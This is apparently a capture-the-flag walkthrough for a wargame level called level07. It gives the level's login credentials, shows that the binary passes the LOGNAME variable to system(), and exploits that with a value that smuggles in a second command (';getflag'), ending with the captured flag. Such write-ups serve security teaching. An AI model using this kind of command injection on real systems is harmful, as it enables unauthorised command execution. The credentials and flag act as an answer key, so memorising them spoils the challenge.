username: level07  
password: wiok45aaoguiboiki2tuin6ub
---

The environment variable `LOGNAME` is given as argument to `/bin/echo`, then executed using `system()`.

```
$ ltrace ./level07
...
getenv("LOGNAME")
...
system("/bin/echo level07 "level07
...
```
The following command outputs the flag

```
LOGNAME=';getflag' ./level07
```

The flag is: fiumuikeil55xe9cu4dood66h
